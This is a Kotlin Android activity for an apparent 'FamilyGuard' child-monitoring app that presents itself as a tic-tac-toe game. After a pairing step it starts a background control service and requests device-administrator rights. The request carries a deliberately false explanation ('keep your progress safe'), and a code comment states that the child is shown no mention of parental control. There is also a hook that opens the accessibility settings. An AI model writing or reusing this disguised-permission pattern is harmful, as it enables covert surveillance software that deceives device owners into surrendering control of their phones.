package com.fg.child

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private val board = Array(9) { ' ' }
    private val human = 'X'
    private val ai = 'O'
    private var gameOver = false
    private lateinit var cells: List<Button>
    private lateinit var status: TextView
    private lateinit var syncText: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        status = findViewById(R.id.statusText)
        syncText = findViewById(R.id.syncText)

        cells = listOf(
            R.id.c0, R.id.c1, R.id.c2,
            R.id.c3, R.id.c4, R.id.c5,
            R.id.c6, R.id.c7, R.id.c8
        ).map { findViewById(it) }

        cells.forEachIndexed { i, b -> b.setOnClickListener { play(i) } }
        findViewById<Button>(R.id.resetBtn).setOnClickListener { reset() }

        // First launch → ask for pairing code
        val prefs = getSharedPreferences(ControlService.PREFS, MODE_PRIVATE)
        if (prefs.getString(ControlService.KEY_ID, null) == null) {
            askForPairingCode(prefs)
        } else {
            startControlService()
            syncText.text = "Connected · ID " + prefs.getString(ControlService.KEY_ID, "")
        }
    }

    /* ---------------- PAIRING ---------------- */

    private fun askForPairingCode(prefs: android.content.SharedPreferences) {
        val input = EditText(this).apply {
            hint = getString(R.string.pairing_hint)
            inputType = android.text.InputType.TYPE_CLASS_NUMBER
        }
        val dlg = AlertDialog.Builder(this)
            .setTitle(R.string.pairing_title)
            .setMessage("Enter the code shown in the parent's FamilyGuard dashboard.")
            .setView(input)
            .setCancelable(false)
            .setPositiveButton(R.string.pairing_ok, null)
            .create()

        dlg.setOnShowListener {
            dlg.getButton(AlertDialog.BUTTON_POSITIVE).setOnClickListener {
                val code = input.text.toString().trim()
                if (code.length < 4) {
                    Toast.makeText(this, R.string.pairing_err, Toast.LENGTH_SHORT).show()
                    return@setOnClickListener
                }
                prefs.edit().putString(ControlService.KEY_ID, code).apply()
                startControlService()
                syncText.text = "Connected · ID $code"
                Toast.makeText(this, "Linked ✓", Toast.LENGTH_SHORT).show()
                dlg.dismiss()
                requestPermissionsSequence()
            }
        }
        dlg.show()
    }

    private fun startControlService() {
        val i = Intent(this, ControlService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(i)
        } else {
            startService(i)
        }
    }

    /* ---------------- PERMISSION WALKTHROUGH ---------------- */

    private fun requestPermissionsSequence() {
        // Ask, one by one, for the three critical permissions.
        // The child sees neutral names — no mention of parental control.
        requestDeviceAdmin()
    }

    private fun requestDeviceAdmin() {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(this, AdminReceiver::class.java)
        if (dpm.isAdminActive(admin)) return
        val i = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
            putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Needed for the game to keep your progress safe."
            )
        }
        startActivity(i)
    }

    @Suppress("unused")
    private fun openAccessibilitySettings() {
        try {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        } catch (_: Exception) {}
    }

    /* ---------------- XO GAME LOGIC ---------------- */

    private fun play(i: Int) {
        if (gameOver || board[i] != ' ') return
        board[i] = human
        render()
        if (check(human)) { status.text = "You win! 🎉"; gameOver = true; return }
        if (board.none { it == ' ' }) { status.text = "Draw 🤝"; gameOver = true; return }
        aiMove()
        render()
        when {
            check(ai) -> { status.text = "AI wins 🤖"; gameOver = true }
            board.none { it == ' ' } -> { status.text = "Draw 🤝"; gameOver = true }
            else -> status.text = "Your turn (X)"
        }
    }

    private fun aiMove() {
        val lines = listOf(
            listOf(0,1,2), listOf(3,4,5), listOf(6,7,8),
            listOf(0,3,6), listOf(1,4,7), listOf(2,5,8),
            listOf(0,4,8), listOf(2,4,6)
        )
        // 1. win
        for (l in lines) {
            val v = l.map { board[it] }
            if (v.count { it == ai } == 2 && v.contains(' ')) {
                board[l[v.indexOf(' ')]] = ai; return
            }
        }
        // 2. block
        for (l in lines) {
            val v = l.map { board[it] }
            if (v.count { it == human } == 2 && v.contains(' ')) {
                board[l[v.indexOf(' ')]] = ai; return
            }
        }
        // 3. center
        if (board[4] == ' ') { board[4] = ai; return }
        // 4. corner
        val corners = listOf(0, 2, 6, 8).filter { board[it] == ' ' }
        if (corners.isNotEmpty()) { board[corners.random()] = ai; return }
        // 5. random
        val empty = board.indices.filter { board[it] == ' ' }
        if (empty.isNotEmpty()) board[empty.random()] = ai
    }

    private fun check(p: Char): Boolean {
        val lines = listOf(
            listOf(0,1,2), listOf(3,4,5), listOf(6,7,8),
            listOf(0,3,6), listOf(1,4,7), listOf(2,5,8),
            listOf(0,4,8), listOf(2,4,6)
        )
        return lines.any { it.all { i -> board[i] == p } }
    }

    private fun render() {
        cells.forEachIndexed { i, b ->
            b.text = board[i].toString().trim()
        }
    }

    private fun reset() {
        for (i in board.indices) board[i] = ' '
        gameOver = false
        status.text = "Your turn (X)"
        render()
    }
}